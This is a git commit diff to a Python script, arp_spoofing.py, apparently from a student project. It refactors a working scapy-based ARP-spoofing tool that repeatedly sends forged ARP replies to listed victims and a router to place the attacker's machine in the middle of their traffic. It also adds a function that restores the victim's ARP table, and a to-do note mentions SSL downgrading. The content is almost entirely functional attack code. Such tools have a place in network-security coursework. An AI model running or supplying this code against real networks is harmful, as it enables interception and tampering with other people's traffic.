35ab3738491c0fdf0d435ebdbc4f08f02c40e022
melvinhoogendoorn <m.s.hoogendoorn@student.tue.nl>
2024-06-05 16:11:49 +0200

    added threads, some refactoring

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -3,9 +3,8 @@
 import time
 import sys
 import scapy.all as scapy
+#from scapy.all import *
 import os
-
-iface = None
 
 # MAC address function which will return
 # the mac_address of the provided ip address 
@@ -19,49 +18,64 @@ def get_mac(ip):
      
     # return a list of MAC addresses with respective
     # MAC addresses and IP addresses.
-    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, iface=iface)[0]
+    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, iface=IFACE)[0]
     if answ:
         # we choose the first MAC address and select
         # the MAC address using the field hwsrc
         return answ[0][1].hwsrc
     else:
-        raise Exception("No arp response for {}".format(ip))
+        print("No ARP response for {}".format(ip))
+        sys.exit(0)
 
  
  
 def arp_spoof(target_ip, spoof_ip):
-    """" Here the ARP packet is set to response and
-    pdst is set to the target IP 
-    either it is for victim or router and the hwdst
-    is the MAC address of the IP provided
-    and the psrc is the spoofing ip address
-    to manipulate the packet"""
-     
-    packet = scapy.ARP(op=2, pdst=target_ip,
+    """"Create and send ARP packet"""
+    arp = scapy.ARP(op=2, pdst=target_ip,
                        hwdst=get_mac(target_ip), psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    ether = scapy.Ether(src=ATTACKER_MAC)
+    packet = ether/arp
+    scapy.sendp(packet, verbose=False, iface=IFACE)
+
+def restore(victim_ip, source_ip):
+    """"Restore arp table of victim"""
+    victim_mac = get_mac(victim_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.sendp(packet, count=4, verbose=False, iface=IFACE)
  
 
-def arp_main(silent, manual, router, input_iface):
+def arp_main(attacker_addr, manual, router, input_iface, silent):
     # TOADD: 
-    # - arguments: silent/allin, autoscan/manualinput, dns things, input for all addresses
-    # - threads
     # - ssl downgrading
-    # victim_ip = input()  # taking the victim ip_address
-    # router_ip = input()  # taking the router ip address
+    if manual is None:
+        print("No victim addresses given, quiting...")
+        sys.exit()
+    if router is None:
+        print("No router address given, quiting...")
+        sys.exit()
     victim_addresses = manual
     router_ip = router
-    global iface 
-    iface = input_iface
+    global IFACE
+    global ATTACKER_IP
+    global ATTACKER_MAC
+    IFACE = input_iface
+    ATTACKER_IP = attacker_addr[0]
+    ATTACKER_MAC = attacker_addr[1]
     sent_packets_count = 0  # initializing the packet counter
+    print(ATTACKER_IP, ATTACKER_MAC)
 
     while True:
         for victim_ip in victim_addresses:
             sent_packets_count += 2
             arp_spoof(victim_ip, router_ip)
             arp_spoof(router_ip, victim_ip)
-            sys.stdout.write("[+] Packets sent " + str(sent_packets_count) + "\r")
+            sys.stdout.flush()
+            print("[+] Packets sent " + str(sent_packets_count), end="\r")
             sys.stdout.flush()
             time.sleep(2)
+
+        
 
         
